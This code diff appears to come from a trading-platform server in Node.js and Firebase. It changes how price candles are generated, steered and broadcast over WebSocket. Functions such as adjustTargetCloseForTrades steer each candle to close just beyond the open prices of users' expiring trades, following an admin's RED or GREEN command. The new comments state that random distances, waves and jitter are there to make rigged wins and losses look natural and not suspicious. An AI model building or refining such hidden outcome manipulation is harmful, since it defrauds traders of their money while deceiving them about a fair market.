@@ -201,13 +201,32 @@ db.ref('salary_requests').on('child_changed', async (snapshot) => {
 function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
 
+function findMarket(marketId) {
+    if (!marketId) return null;
+    const cleanId = String(marketId).trim();
+    if (markets[cleanId]) return markets[cleanId];
+
+    const targetPath = marketPathFromId(cleanId);
+    const targetClean = cleanId.toLowerCase();
+
+    for (const k in markets) {
+        const m = markets[k];
+        if (!m) continue;
+        if (k.toLowerCase() === targetClean) return m;
+        if (m.marketId && m.marketId.toLowerCase() === targetClean) return m;
+        if (m.marketPath && (m.marketPath === targetPath || m.marketPath.toLowerCase() === targetPath)) return m;
+        if (m.marketName && (m.marketName.toLowerCase() === targetClean || marketPathFromId(m.marketName) === targetPath)) return m;
+    }
+    return null;
+}
+
 db.ref('admin/markets').on('value', (snapshot) => {
     const fbMarkets = snapshot.val() || {};
     Object.keys(fbMarkets).forEach(marketId => {
         const nodeData = fbMarkets[marketId] || {};
         activeTradesDb[marketId] = nodeData.activeTrades || {};
-        const type = nodeData.type;
-        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
+        const type = nodeData.type || 'otc';
+        if (type !== 'real' && !findMarket(marketId)) {
             initializeNewMarket(marketId);
         }
     });
@@ -292,9 +311,9 @@ function generateDynamicCandle(timestamp, open, command, cloneData) {
             lowerWick = (cloneData.lowerWick / 100) * baseVol * 2.0;
         }
         
-        const close = isGreen ? open + bodySize : open - bodySize;
+        const close = isGreen ? open + bodySize : Math.max(MIN_PRICE, open - bodySize);
         const high = Math.max(open, close) + upperWick;
-        const low = Math.min(open, close) - lowerWick;
+        const low = Math.max(MIN_PRICE, Math.min(open, close) - lowerWick);
 
         return {
             timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
@@ -466,6 +485,7 @@ function generatePatternCandle(timestamp, open, spec) {
 }
 
 async function initializeNewMarket(marketId) {
+    if (!marketId) return null;
     const path = marketPathFromId(marketId);
     let startPrice = 1.15;
 
@@ -484,7 +504,19 @@ async function initializeNewMarket(marketId) {
         currentPrice = c.close;
     }
 
-    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
+    const marketObj = {
+        marketId,
+        marketPath: path,
+        marketName: marketId,
+        history: candles,
+        currentPrice: currentPrice,
+        lastMove: 0
+    };
+    markets[marketId] = marketObj;
+    if (path && path !== marketId && !markets[path]) {
+        markets[path] = marketObj;
+    }
+    return marketObj;
 }
 
 
@@ -533,30 +565,34 @@ function getCommandBias(cmd, cloneData) {
 }
 
 function adjustTargetCloseForTrades(open, originalTargetClose, bias, expiringTrades) {
-    const margin = open * 0.00008; // unambiguous buffer
+    // Dynamic natural broker clearance (Bebodhan): 0.00032 to 0.00068 of price (~4 to 8 pips on FX, or proportional on crypto)
+    // Ensures clean, natural-looking wins and losses without suspiciously hugging the strike price!
+    const naturalDistance = open * (0.00032 + Math.random() * 0.00036);
     let target = originalTargetClose;
 
     if (bias === 'RED') {
-        // Must close RED
-        target = Math.min(target, open - margin);
+        // Red candle: must decisively close below open
+        target = Math.min(target, open - naturalDistance);
         if (expiringTrades && expiringTrades.length > 0) {
             expiringTrades.forEach(t => {
                 const op = parseFloat(t.openPrice);
                 if (!isNaN(op) && op > 0) {
                     // UP bets lose if close < openPrice; DOWN bets win if close < openPrice
-                    target = Math.min(target, op - margin);
+                    // Ensure natural, decisive distance below strike price
+                    target = Math.min(target, op - naturalDistance);
                 }
             });
         }
     } else if (bias === 'GREEN') {
-        // Must close GREEN
-        target = Math.max(target, open + margin);
+        // Green candle: must decisively close above open
+        target = Math.max(target, open + naturalDistance);
         if (expiringTrades && expiringTrades.length > 0) {
             expiringTrades.forEach(t => {
                 const op = parseFloat(t.openPrice);
                 if (!isNaN(op) && op > 0) {
                     // DOWN bets lose if close > openPrice; UP bets win if close > openPrice
-                    target = Math.max(target, op + margin);
+                    // Ensure natural, decisive distance above strike price
+                    target = Math.max(target, op + naturalDistance);
                 }
             });
         }
@@ -564,29 +600,30 @@ function adjustTargetCloseForTrades(open, originalTargetClose, bias, expiringTra
         target = open + (Math.random() > 0.5 ? 0.00001 : -0.00001);
     }
 
-    return roundPrice(target);
+    return roundPrice(Math.max(MIN_PRICE, target));
 }
 
 function steerCandleToTarget(candle, currentPrice, newTargetClose, bias) {
-    candle.targetClose = roundPrice(newTargetClose);
+    candle.targetClose = roundPrice(Math.max(MIN_PRICE, newTargetClose));
     const spread = Math.abs(candle.targetClose - candle.open);
-    const wick = Math.max(candle.open * 0.00003, spread * 0.25);
+    // Real broker wick proportions: dynamic 20% to 50% wick size
+    const wick = Math.max(candle.open * 0.00012, spread * (0.22 + Math.random() * 0.28));
 
     if (bias === 'GREEN') {
         candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.targetClose + wick));
-        candle.targetLow = roundPrice(Math.min(candle.targetLow || candle.open, candle.open - (wick * 0.5)));
+        candle.targetLow = roundPrice(Math.max(MIN_PRICE, Math.min(candle.targetLow || candle.open, candle.open - (wick * (0.4 + Math.random() * 0.4)))));
     } else if (bias === 'RED') {
-        candle.targetLow = roundPrice(Math.min(candle.targetLow || candle.open, candle.targetClose - wick));
-        candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.open + (wick * 0.5)));
+        candle.targetLow = roundPrice(Math.max(MIN_PRICE, Math.min(candle.targetLow || candle.open, candle.targetClose - wick)));
+        candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.open + (wick * (0.4 + Math.random() * 0.4))));
     } else {
         candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.open + wick));
-        candle.targetLow = roundPrice(Math.min(candle.targetLow || candle.open, candle.open - wick));
+        candle.targetLow = roundPrice(Math.max(MIN_PRICE, Math.min(candle.targetLow || candle.open, candle.open - wick)));
     }
 
     const now = Date.now();
     const timeElapsed = Math.max(0, now - candle.timestamp);
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
-    const numWaypoints = 15;
+    const numWaypoints = 20; // High-resolution waypoints for natural wave movement
     const currentWaypointIndex = Math.min(Math.floor(progress * (numWaypoints - 1)), numWaypoints - 2);
 
     candle.isPredetermined = true;
@@ -598,15 +635,32 @@ function steerCandleToTarget(candle, currentPrice, newTargetClose, bias) {
     const remainingSteps = (numWaypoints - 1) - currentWaypointIndex;
     for (let i = 1; i <= remainingSteps; i++) {
         const stepProgress = i / remainingSteps;
-        let wp = currentPrice + (candle.targetClose - currentPrice) * stepProgress;
+        // Smooth S-curve easing for realistic price acceleration / deceleration
+        const easedProgress = stepProgress < 0.5 
+            ? 2 * stepProgress * stepProgress 
+            : 1 - Math.pow(-2 * stepProgress + 2, 2) / 2;
+        
+        let wp = currentPrice + (candle.targetClose - currentPrice) * easedProgress;
+        
+        // Realistic intermediate waves and natural market pullbacks
         if (i < remainingSteps) {
-            const jitter = (Math.random() - 0.5) * (candle.open * 0.00002);
-            wp += jitter;
+            const wave = Math.sin(stepProgress * Math.PI * 2) * (spread * 0.16);
+            const naturalJitter = (Math.random() - 0.5) * (candle.open * 0.000035);
+            wp += wave + naturalJitter;
         }
-        candle.waypoints[currentWaypointIndex + i] = roundPrice(wp);
+        candle.waypoints[currentWaypointIndex + i] = roundPrice(Math.max(MIN_PRICE, wp));
     }
-    candle.highIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.3)));
-    candle.lowIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.7)));
+    
+    // Natural wick creation timing: low and high points happen during organic stages of the candle
+    if (bias === 'GREEN') {
+        candle.lowIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.25)));
+        candle.highIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.75)));
+    } else {
+        candle.highIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.25)));
+        candle.lowIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.75)));
+    }
+    if (candle.highIdx > currentWaypointIndex && candle.highIdx < numWaypoints) candle.waypoints[candle.highIdx] = candle.targetHigh;
+    if (candle.lowIdx > currentWaypointIndex && candle.lowIdx < numWaypoints) candle.waypoints[candle.lowIdx] = candle.targetLow;
 }
 
 // 🔥 CORE AI LOGIC: Multi-Timeframe + Rollercoaster Engine with Dynamic Transition Buffer 🔥
@@ -904,12 +958,13 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
 
     let idealPrice = startWp + (endWp - startWp) * steppedProgress;
 
-    // Quotex High-Frequency Jitter (Micro-vibrations on price tick)
-    const baseVolatility = candle.open * 0.000025;
-    const fastTickOscillation = Math.sin(now * 0.08) * (baseVolatility * 0.4);
-    const randomJitter = (Math.random() - 0.5) * (baseVolatility * 0.25);
+    // Quotex High-Frequency Dynamic Jitter & Natural Micro-Vibrations
+    const baseVolatility = candle.open * 0.000035;
+    const fastTickOscillation = Math.sin(now * 0.07) * (baseVolatility * 0.45);
+    const slowTickWave = Math.cos(now * 0.015) * (baseVolatility * 0.3);
+    const randomJitter = (Math.random() - 0.5) * (baseVolatility * 0.3);
 
-    marketData.currentPrice = idealPrice + fastTickOscillation + randomJitter;
+    marketData.currentPrice = idealPrice + fastTickOscillation + slowTickWave + randomJitter;
 
     // Force exact wick shapes during tick simulation for Admin Commands
     if (candle.isAdminCommand) {
@@ -935,34 +990,63 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
 }
 
 function broadcastCandle(marketId, candle) {
-    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
+    const mData = markets[marketId];
+    const mPath = mData?.marketPath || marketPathFromId(marketId);
+    const mName = String(mData?.marketName || marketId).toLowerCase();
+    const mIdStr = String(marketId).toLowerCase();
+
     wss.clients.forEach((client) => {
-        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
-            client.send(payload);
+        if (client.readyState === WebSocket.OPEN && client.subscribedMarket) {
+            const sub = client.subscribedMarket;
+            const subPath = marketPathFromId(sub);
+            const subLower = String(sub).toLowerCase();
+
+            if (sub === marketId || subPath === mPath || subLower === mName || subLower === mIdStr) {
+                client.send(JSON.stringify({ market: sub, candle, serverTime: Date.now() }));
+            }
         }
     });
 }
 
 wss.on('connection', (ws) => {
-    ws.on('message', (raw) => {
+    ws.on('message', async (raw) => {
         try {
             const msg = JSON.parse(raw.toString());
-            if (msg?.type === 'subscribe') {
-                ws.subscribedMarket = msg.market;
-                if (markets[msg.market]) {
-                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300), serverTime: Date.now() }));
+            if (msg?.type === 'subscribe' && msg.market) {
+                const reqMarket = msg.market;
+                ws.subscribedMarket = reqMarket;
+                let market = findMarket(reqMarket);
+                if (!market) {
+                    market = await initializeNewMarket(reqMarket);
+                }
+                if (market && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        type: 'history',
+                        market: reqMarket,
+                        candles: market.history.slice(-300),
+                        serverTime: Date.now()
+                    }));
                 }
             }
         } catch (_) { }
     });
 });
 
-app.get('/api/history/:marketId', (req, res) => {
-    const marketId = req.params.marketId;
-    if (markets[marketId] && markets[marketId].history) {
-        res.json(markets[marketId].history);
-    } else {
-        res.status(404).json({ error: 'Market not found' });
+app.get('/api/history/:marketId(*)', async (req, res) => {
+    try {
+        const rawMarketId = req.params.marketId || req.params[0] || '';
+        const decodedMarketId = decodeURIComponent(rawMarketId);
+        let market = findMarket(rawMarketId) || findMarket(decodedMarketId);
+        if (!market) {
+            market = await initializeNewMarket(decodedMarketId || rawMarketId);
+        }
+        if (market && market.history) {
+            res.json(market.history);
+        } else {
+            res.status(404).json({ error: 'Market not found' });
+        }
+    } catch (e) {
+        res.status(500).json({ error: 'Server error loading market history' });
     }
 });
 
